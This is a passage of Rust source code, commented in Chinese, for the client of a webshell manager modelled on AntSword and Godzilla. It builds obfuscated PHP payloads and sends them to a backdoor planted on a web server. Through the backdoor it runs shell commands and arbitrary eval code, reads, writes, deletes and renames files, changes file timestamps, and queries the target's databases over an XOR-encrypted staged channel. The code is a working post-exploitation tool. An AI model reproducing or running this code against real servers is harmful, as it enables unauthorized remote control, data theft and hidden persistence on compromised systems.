        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|duration| duration.subsec_nanos())
            .unwrap_or(0);
        bytes = (nanos as u64).to_le_bytes();
    }
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// 将 unix 时间戳格式化为本地时间的 `YYYY-MM-DD HH:MM`。
fn format_timestamp(ts: i64) -> String {
    use chrono::{DateTime, Local};
    DateTime::from_timestamp(ts, 0)
        .map(|datetime| {
            datetime
                .with_timezone(&Local)
                .format("%Y-%m-%d %H:%M")
                .to_string()
        })
        .unwrap_or_default()
}

impl Protocol for PhpProtocol {
    fn id(&self) -> &'static str {
        PHP_PROTOCOL_ID
    }

    fn display_name(&self) -> &'static str {
        "标准 PHP WebShell（类蚁剑）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn run_code(
        &self,
        session: &dyn SessionState,
        language: &str,
        code: &str,
        settings: &AppSettings,
    ) -> Result<String, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if language != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "PHP 协议暂不支持 {language} 代码执行"
            )));
        }
        // S1：任意代码执行安全闸 + 载荷长度上限（64KB）
        if !settings.allow_arbitrary_code {
            return Err(ProtocolError::NotSupported(
                "run_code 任意代码执行已禁用（设置 allow_arbitrary_code=false）".into(),
            ));
        }
        if code.len() > 64 * 1024 {
            return Err(ProtocolError::NotSupported(format!(
                "run_code 载荷超过长度上限（{} / 65536 字节）",
                code.len()
            )));
        }
        // 能力门禁：插件/代码通道依赖 stub 的 eval 能力（旧 stub 未上报 → 不拒绝）
        require_capability(php, "exec")?;
        // 1) S2：优先 eval 通道（单次往返、无临时文件落地）
        //    载荷剥离 <?php 后直接经 dispatch eval 执行（eval_fn try/catch 包裹）。
        //    失败（代码致命错误/目标不支持 eval）时降级临时文件通道。
        let script = code
            .trim_start()
            .strip_prefix("<?php")
            .map(str::trim_start)
            .unwrap_or(code);
        match dispatch(php, "eval", &[("c", script)], settings) {
            Ok(value) => {
                let text = value
                    .pointer("/data")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();
                return Ok(text);
            }
            Err(_) => {
                // 降级：临时文件通道（目标 eval 不可用或载荷依赖独立请求环境）
            }
        }
        // 2) 降级通道：获取目标当前目录 + 随机文件名 + 写入载荷
        let cwd = self
            .execute_command(session, "pwd 2>/dev/null", settings)?
            .stdout
            .trim()
            .to_string();
        if cwd.is_empty() {
            return Err(ProtocolError::ServerError(
                "run_code 降级通道失败：无法获取目标当前目录（命令通道不可用且 eval 失败）"
                    .to_string(),
            ));
        }
        // 注意：点开头文件在部分 PHP 内置服务器下行为异常（反弹 shell 无输出），
        // 使用下划线前缀（仍为随机难猜，且兼容隐藏意图）
        let name = format!("_dsw_{:x}.php", uuid::Uuid::new_v4().simple());
        let path = format!("{cwd}/{name}");
        self.write_file(session, &path, code.as_bytes(), settings)?;
        // 3) HTTP 请求执行（同目录 URL）
        let mut url = url::Url::parse(&php.endpoint)
            .map_err(|error| ProtocolError::ParseError(format!("Endpoint 解析失败：{error}")))?;
        let new_path = url
            .path()
            .rsplit_once('/')
            .map(|(dir, _)| format!("{dir}/{name}"))
            .unwrap_or_else(|| format!("/{name}"));
        url.set_path(&new_path);
        let response = php
            .client
            .get(url)
            .timeout(std::time::Duration::from_secs(
                settings.default_timeout_secs.max(10),
            ))
            .send()
            .map_err(|error| ProtocolError::Network(error.to_string()))?;
        if !response.status().is_success() {
            let _ = self.delete_path(session, &path, settings);
            return Err(ProtocolError::HttpStatus(
                response.status().as_u16(),
                "载荷执行失败：目标无法访问临时脚本（当前目录与文档根不一致或不可写）".to_string(),
            ));
        }
        // 限长读取响应：临时脚本必须在**所有**返回路径上删除，否则读取失败会
        // 把可执行载荷留在目标文档根（未鉴权可访问）。
        let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
        let read_result = crate::protocol::transport::read_limited(response, max_bytes);
        // 4) 清理临时载荷
        let _ = self.delete_path(session, &path, settings);
        let bytes = read_result.map_err(|error| ProtocolError::ParseError(error.to_string()))?;
        if bytes.len() > max_bytes as usize {
            return Err(ProtocolError::ParseError(format!(
                "响应超过大小上限（{}MB）",
                settings.max_file_size_mb
            )));
        }
        Ok(String::from_utf8_lossy(&bytes).into_owned())
    }

    fn heartbeat(
        &self,
        session: &dyn SessionState,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            // NATIVE / 分阶段：probe 在**所有版本**的 stub 上都存在，
            // 不需要新的能力位（旧 stub 也能量到心跳）
            dispatch(php, "probe", &[], settings).map(|_| ())
        } else {
            // legacy：逐请求探测模板（与连接探测同一份代码）
            let code = Self::legacy_probe_code(php.encoder, &php.password);
            self.send_frame(php, &code, settings, "heartbeat")
                .map(|_| ())
        }
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        self.probe_impl(profile, settings, None)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        // 先探测验证密码与连通性，再建立会话（探测与会话复用同一连接池）
        let client = build_client(settings);
        let result = self.probe_impl(profile, settings, Some(&client))?;
        let encoder = encoder_for(&profile.protocol_params)?;
        // 分块能力：由 stub 的 probe 上报（NATIVE `__ENV__` / 分阶段 probe 的 info 表）
        let chunked = result
            .info
            .get("ChunkedTransfer")
            .map(|value| value == "1")
            .unwrap_or(false);
        let session: Box<dyn SessionState> = Box::new(PhpSession {
            endpoint: profile.endpoint.clone(),
            password: effective_password(&profile.protocol_params, &profile.password),
            client,
            encoder,
            initialized: std::sync::Mutex::new(false),
            session_mode: session_mode_for(&profile.protocol_params, encoder),
            chunked,
            cwd: std::sync::Mutex::new(result.current_dir.clone()),
            aead: aead_state(
                encoder,
                &effective_password(&profile.protocol_params, &profile.password),
            ),
            capabilities: result.capabilities.clone(),
            transport: TransportProfile::from_protocol_params(&profile.protocol_params)?,
        });
        Ok((session, result))
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_exec(php, command, settings);
        }
        let cmd_b64 = B64.encode(command.as_bytes());
        // 与 NATIVE / 分阶段通道共用同一份实现：命令函数降级链（shell_exec →
        // exec → system/passthru → popen）、`cd` 前缀、cwd 回传。
        // 旧实现硬用 `@shell_exec`，目标禁用 shell_exec 时命令通道直接死。
        let dir_b64 = B64.encode(php.current_dir().as_bytes());
        let code = format!(
            "{}\n$c=@$__g[5]('{cmd_b64}');$w=@$__g[5]('{dir_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('stdout'=>$stdout,'cwd'=>$cwd)):array('ok'=>false,'error'=>$err);{}",
            Self::build_prefix(php.encoder, &php.password),
            dosword_sdk::php_impl::PHP_EXEC_IMPL,
            TEMPLATE_FRAME
        );
        let start = Instant::now();
        let value = self.send_frame(php, &code, settings, "exec")?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let raw = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok());
        let stdout = raw
            .as_deref()
            .and_then(|bytes| String::from_utf8(bytes.to_vec()).ok())
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        if let Some(ref dir) = cwd {
            php.update_cwd(dir);
        }

        Ok(CommandOutput {
            stdout,
            duration_ms,
            cwd,
            raw_b64: raw.map(|bytes| B64.encode(bytes)),
        })
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_list_dir(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=@$__g[5]('{path_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('entries'=>$entries)):array('ok'=>false,'error'=>$err);{}",
            Self::build_prefix(php.encoder, &php.password),
            dosword_sdk::php_impl::PHP_SCAN_IMPL,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(php, &code, settings, "list_dir")?;

        let entries: Vec<FileEntry> = value
            .pointer("/data/entries")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|item| FileEntry {
                        name: item
                            .get("name")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                        path: item
                            .get("path")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                        is_dir: item
                            .get("is_dir")
                            .and_then(|v| v.as_bool())
                            .unwrap_or(false),
                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                        modified: item
                            .get("mtime")
                            .and_then(|v| v.as_i64())
                            .map(format_timestamp)
                            .unwrap_or_default(),
                        perms: item
                            .get("perms")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                    })
                    .collect()
            })
            .unwrap_or_default();

        Ok(DirListing { entries })
    }

    fn batch_list_dir(
        &self,
        session: &dyn SessionState,
        paths: &[String],
        settings: &AppSettings,
    ) -> Result<dosword_sdk::protocol::BatchDirResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        require_capability(php, "batch")?;
        if paths.is_empty() {
            return Ok(Vec::new());
        }
        let ops: Vec<Value> = paths
            .iter()
            .map(|path| serde_json::json!({ "a": "list", "p": path }))
            .collect();
        let results = dispatch_batch(php, &ops, settings)?;
        if results.len() != paths.len() {
            return Err(ProtocolError::ParseError(format!(
                "批量响应条数不符（{} 项请求 / {} 项返回）",
                paths.len(),
                results.len()
            )));
        }
        Ok(paths
            .iter()
            .cloned()
            .zip(
                results
                    .iter()
                    .map(|result| parse_dir_listing(result).map_err(|error| error.to_string())),
            )
            .collect())
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_read_file(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=@$__g[5]('{path_b64}');$c=@$__g[7]($p);if($c===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}$__r=array('ok'=>true,'data'=>@$__g[6]($c));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(php, &code, settings, "read_file")?;

        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_write_file(php, path, content, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=@$__g[5]('{path_b64}');$d=@$__g[5]('{data_b64}');$r=@$__g[8]($p,$d);if($r===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>$r));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(php, &code, settings, "write_file")?;
        Ok(())
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_delete(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=@$__g[5]('{path_b64}');if(@$__g[10]($p)){{$r=@$__g[12]($p);}}else{{$r=@$__g[11]($p);}}if($r===false){{$__r=array('ok'=>false,'error'=>'删除失败（目录非空或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(php, &code, settings, "delete")?;
        Ok(())
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_rename(php, from, to, settings);
        }
        let from_b64 = B64.encode(from.as_bytes());
        let to_b64 = B64.encode(to.as_bytes());
        let code = format!(
            "{}\n$f=@$__g[5]('{from_b64}');$t=@$__g[5]('{to_b64}');$r=@$__g[13]($f,$t);if($r===false){{$__r=array('ok'=>false,'error'=>'重命名失败');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(php, &code, settings, "rename")?;
        Ok(())
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_mkdir(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=@$__g[5]('{path_b64}');$r=@$__g[14]($p,0755,true);if($r===false){{$__r=array('ok'=>false,'error'=>'创建目录失败（权限不足或已存在）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(php, &code, settings, "mkdir")?;
        Ok(())
    }

    fn touch_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        timestamp: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_touch(php, path, timestamp, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let ts = timestamp.to_string();
        let code = format!(
            "{}\n$p=@$__g[5]('{path_b64}');$r=@$__g[25]($p,{ts});if($r===false){{$__r=array('ok'=>false,'error'=>'touch 失败（路径不存在或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(php, &code, settings, "touch")?;
        Ok(())
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        // NATIVE / 分阶段载荷：必须走内置功能分发（stub 的 read 支持 o/l）。
        // 早期实现在此处漏了分支，导致默认编码器下上传/下载全部失败。
        if is_session(php) {
            if !php.chunked {
                return Err(ProtocolError::NotSupported(
                    "目标 stub 不支持分块读取（未上报 ChunkedTransfer 能力）：\
                     请用当前版本重新生成并上传 stub"
                        .to_string(),
                ));
            }
            let offset_text = offset.to_string();
            let length_text = length.to_string();
            let value = dispatch(
                php,
                "read",
                &[("p", path), ("o", &offset_text), ("l", &length_text)],
                settings,
            )?;
            return value
                .get("data")
                .and_then(|v| v.as_str())
                .and_then(|s| B64.decode(s).ok())
                .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()));
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=@$__g[5]('{path_b64}');$off={off};$len={len};$f=@$__g[29]($p,'rb');if($f===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}\nif($off>0){{@$__g[30]($f,$off);}}$c=($len>0)?@$__g[21]($f,$len):@$__g[27]($f);@$__g[18]($f);$__r=array('ok'=>true,'data'=>@$__g[6]((string)$c));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
            len = length,
        );
        let value = self.send_frame(php, &code, settings, "read_chunk")?;
        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        // NATIVE / 分阶段载荷：offset=0 截断新建，offset>0 追加写（顺序分块上传）。
        if is_session(php) {
            if !php.chunked {
                return Err(ProtocolError::NotSupported(
                    "目标 stub 不支持分块写入（未上报 ChunkedTransfer 能力）：\
                     请用当前版本重新生成并上传 stub"
                        .to_string(),
                ));
            }
            let data_b64 = B64.encode(content);
            let offset_text = offset.to_string();
            dispatch(
                php,
                "write",
                &[("p", path), ("d", &data_b64), ("o", &offset_text)],
                settings,
            )?;
            return Ok(());
        }
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=@$__g[5]('{path_b64}');$d=@$__g[5]('{data_b64}');$off={off};$mode=($off>0&&@$__g[26]($p))?'r+b':'w+b';$f=@$__g[29]($p,$mode);if($f===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}\n$ok=(@$__g[30]($f,$off)>=0);if($ok){{@$__g[19]($f,$d);}}@$__g[18]($f);if(!$ok){{$__r=array('ok'=>false,'error'=>'写入文件失败（偏移无效）');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>strlen($d)));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
        );
        self.send_frame(php, &code, settings, "write_chunk")?;
        Ok(())
    }

    fn db_probe(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        require_capability(php, "db")?;
        if is_session(php) {
            return self.session_db_probe(php, connection, settings);
        }
        let driver = connection.driver.clone();
        // 与 NATIVE / 分阶段通道同构：连接参数（JSON）交给 stub 端实现，
        // 6 个驱动（含 mssql/oracle/redis）走同一份代码。
        // 旧实现只在客户端拼 PDO DSN，redis 直接被拒、mssql/oracle 列不出库。
        check_driver(&driver)?;
        let conn_b64 = B64.encode(conn_json(connection).as_bytes());
        let code = format!(
            "{}\n{}\n$c=@$__g[5]('{conn_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('driver'=>$driver,'databases'=>$databases)):array('ok'=>false,'error'=>$err);{}",
            Self::build_prefix(php.encoder, &php.password),
            // redis 走裸 RESP，需要 dsw_rsp / dsw_rcmd 辅助（function_exists 守卫，可重复注入）
            dosword_sdk::php_impl::PHP_REDIS_HELPERS,
            dosword_sdk::php_impl::PHP_DB_PROBE_IMPL,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(php, &code, settings, "db_probe")?;
        let databases = value
            .pointer("/data/databases")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        Ok(DbProbeResult {
            driver,
            databases,
            message: "数据库连接成功".to_string(),
        })
    }

    fn db_query(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        require_capability(php, "db")?;
        if is_session(php) {
            return self.session_db_query(php, connection, sql, settings);
        }
        check_driver(&connection.driver)?;
        let conn_b64 = B64.encode(conn_json(connection).as_bytes());
        let sql_b64 = B64.encode(sql.as_bytes());
        let code = format!(
            "{}\n{}\n$c=@$__g[5]('{conn_b64}');$q=@$__g[5]('{sql_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected)):array('ok'=>false,'error'=>$err);{}",
            Self::build_prefix(php.encoder, &php.password),
            dosword_sdk::php_impl::PHP_REDIS_HELPERS,
            dosword_sdk::php_impl::PHP_DB_QUERY_IMPL,
            TEMPLATE_FRAME
        );
        let start = Instant::now();
        let value = self.send_frame(php, &code, settings, "db_query")?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let columns = value
            .pointer("/data/columns")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let rows = value
            .pointer("/data/rows")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|row| {
                        row.as_array()
                            .map(|cells| {
                                cells
                                    .iter()
                                    .map(|cell| {
                                        if cell.is_null() {
                                            None
                                        } else {
                                            Some(cell.as_str().unwrap_or("").to_string())
                                        }
                                    })
                                    .collect()
                            })
                            .unwrap_or_default()
                    })
                    .collect()
            })
            .unwrap_or_default();
        let affected = value
            .pointer("/data/affected")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);

        Ok(DbQueryResult {
            columns,
            rows,
            affected,
            duration_ms,
        })
    }
}

// ---------------------------------------------------------------------------
// Godzilla 分阶段载荷（xor_session）客户端通道
// ---------------------------------------------------------------------------

/// 是否启用分发通道（分阶段载荷 session 模式 或 NATIVE 内置分发）。
fn is_session(php: &PhpSession) -> bool {
    php.session_mode || is_native(php)
}

/// JSON 字符串值转义。
/// 从 probe 响应提取哥斯拉风格环境详情键值。
fn info_map(value: &serde_json::Value) -> std::collections::HashMap<String, String> {
    value
        .pointer("/data/info")
        .and_then(|v| v.as_object())
        .map(|obj| {
            obj.iter()
                .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                .collect()
        })
        .unwrap_or_default()
}

/// 发送一次 body 直传请求（密文），返回 XOR 解密后的明文响应。
fn session_post(
    php: &PhpSession,
    action: &str,
    plaintext: &str,
    body: String,
    settings: &AppSettings,
) -> Result<Vec<u8>, ProtocolError> {
    let started = std::time::Instant::now();
    let mut request = php
        .client
        .post(php.transport.url(&php.endpoint))
        .header("Content-Type", "application/x-www-form-urlencoded");
    for (name, value) in &php.transport.extra_headers {
        request = request.header(name, value);
    }
    let response = match request.body(body).send() {
        Ok(response) => response,
        Err(error) => {
            // 失败请求同样留痕（请求调试页此前对 NATIVE/session 通道完全空白）
            log_request(php, action, 0, started, plaintext, "");
            return Err(ProtocolError::Network(error.to_string()));
        }
    };
    let status = response.status();
    if !status.is_success() {
        log_request(php, action, status.as_u16(), started, plaintext, "");
        return Err(ProtocolError::HttpStatus(
            status.as_u16(),
            status.canonical_reason().unwrap_or("").to_string(),
        ));
    }
    // S10：流式限长读取（与 native_call 一致）。此前是全量缓冲后再比对上限，
    // 恶意目标可用超大响应撑爆内存（release `panic="abort"` 下 OOM 会终止进程）。
    let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
    let bytes = crate::protocol::transport::read_limited(response, max_bytes)
        .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
    if bytes.len() > max_bytes as usize {
        return Err(ProtocolError::ParseError(format!(
            "响应超过大小上限（{}MB）",
            settings.max_file_size_mb
        )));
    }
    // 响应为编码器密文（base64 文本），按编码器解密
    let text = String::from_utf8_lossy(&bytes);
    log_request(php, action, status.as_u16(), started, plaintext, &text);
    decode_payload(php, &text)
}

/// 写一条请求调试记录（统一协议 id 与密码脱敏）。
fn log_request(
    php: &PhpSession,
    action: &str,
    status: u16,
    started: std::time::Instant,
    plaintext: &str,
    response: &str,
) {
    crate::protocol::reqlog::record_request(
        PHP_PROTOCOL_ID,
        action,
        &php.endpoint,
        status,
        started.elapsed().as_millis() as u64,
        plaintext,
        response,
        &php.password,
    );
}

/// 确保处理器代码已注入服务端 session（幂等：已初始化则跳过）。
fn ensure_session_init(php: &PhpSession, settings: &AppSettings) -> Result<(), ProtocolError> {
    let mut initialized = php
        .initialized
        .lock()
        .map_err(|_| ProtocolError::ParseError("会话状态锁异常".to_string()))?;
    if *initialized {
        return Ok(());
    }
    let code = dosword_sdk::encoder::session_handler_code();
    let payload = encode_payload(php, code)?;
    let plain = session_post(php, "session_init", code, payload, settings)?;
    let text = String::from_utf8_lossy(&plain);
    if !text.contains("ok") {
        return Err(ProtocolError::ServerError(format!(
            "分阶段载荷初始化失败：{text}"
        )));
    }
    *initialized = true;
    Ok(())
}

/// 调用一次处理器操作：参数 JSON（XOR 加密）-> 解密响应 -> nonce 帧解析。
fn session_call(
    php: &PhpSession,
    action: &str,
    params: &[(&str, &str)],
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    let mut request = serde_json::Map::new();
    request.insert("a".to_string(), Value::String(action.to_string()));
    for (key, value) in params {
        request.insert((*key).to_string(), Value::String((*value).to_string()));
    }
    session_call_json(php, action, &Value::Object(request), settings)
}

/// 分阶段通道的原始 JSON 调用（支持嵌套结构，如批量的 `ops` 数组）。
fn session_call_json(
    php: &PhpSession,
    action: &str,
    request: &Value,
    settings: &AppSettings,
) -> Result<Value, ProtocolError> {
    ensure_session_init(php, settings)?;
    let nonce = random_nonce();
    // 帧定位用的 nonce 由客户端注入到请求对象里（处理器原样回显）
    let mut request = request.clone();
    let Some(object) = request.as_object_mut() else {
        return Err(ProtocolError::ParseError(
            "请求必须是 JSON 对象".to_string(),
        ));
    };
    object.insert("n".to_string(), Value::String(nonce.clone()));
    let request_text = request.to_string();

    // gzip：分阶段载荷在**明文层**压缩，包成 {"n":..,"z":1,"d":base64(gzip(原请求))}。
    // 处理器是客户端每次连接注入的，所以这条路径不受目标上已部署 stub 版本影响；
    // 压缩位置放在明文层而非密文层：密文是高频熵数据，gzip 收益接近零，
    // 而 base64 载荷（上传/下载分块）的 33% 膨胀可以被真正收回。
    let gzip_ok = php
        .capabilities
        .as_ref()
        .map(|caps| caps.supports("gzip_plain"))
        .unwrap_or(true);
    let mut sent = request_text.clone();
    if settings.gzip_enabled && gzip_ok && request_text.len() >= 1024 {
        let encoded = B64.encode(request_text.as_bytes());
        let packed = crate::protocol::transport::gzip_payload(&encoded, true);
        // 压缩无收益（高熵内容）时按原样发送，避免"压缩后更大"
        if packed != encoded {
            sent = format!("{{\"n\":\"{nonce}\",\"z\":1,\"d\":\"{packed}\"}}");
        }
    }
    let payload = encode_payload(php, &sent)?;
    let plain = session_post(php, action, &request_text, payload, settings)?;
    // 响应：处理器可能把帧内容先 gzip 再 base64（按魔数识别，无需版本协商）
    let plain = crate::protocol::transport::gunzip_bytes_if_needed(plain);
    let text = String::from_utf8_lossy(&plain);

    // 帧解析（处理器返回 nonce 帧包裹的 base64 JSON）
    let start = text
        .find(&nonce)
        .ok_or_else(|| ProtocolError::ParseError(format!("响应中未找到协议帧（{text}）")))?;
    let tail = &text[start + nonce.len()..];
    let end = tail
        .find(&nonce)
        .ok_or_else(|| ProtocolError::ParseError("协议帧不完整".to_string()))?;
    let payload_b64 = &tail[..end];
    let decoded = B64
        .decode(payload_b64)
        .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
    let value: Value = serde_json::from_slice(&decoded)
        .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;
    if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
        let message = value
            .get("error")
            .and_then(|v| v.as_str())
            .unwrap_or("未知错误");
        return Err(ProtocolError::ServerError(message.to_string()));
    }
    Ok(value)
}

/// 构造明文层 gzip 信封：`{"z":1,"d":"<base64(gzip(原请求 JSON))>"}`。
///
/// 压缩在**加密之前**发生，才能收回 base64 的 33% 膨胀；压缩无收益
/// （小载荷 / 高熵内容）时返回 `None`，调用方按原样发送。
fn gzip_plain_envelope(request: &str) -> Option<String> {
    let encoded = B64.encode(request.as_bytes());
    let packed = crate::protocol::transport::gzip_payload(&encoded, true);
    if packed == encoded {
        return None;
    }
    Some(format!("{{\"z\":1,\"d\":\"{packed}\"}}"))
}

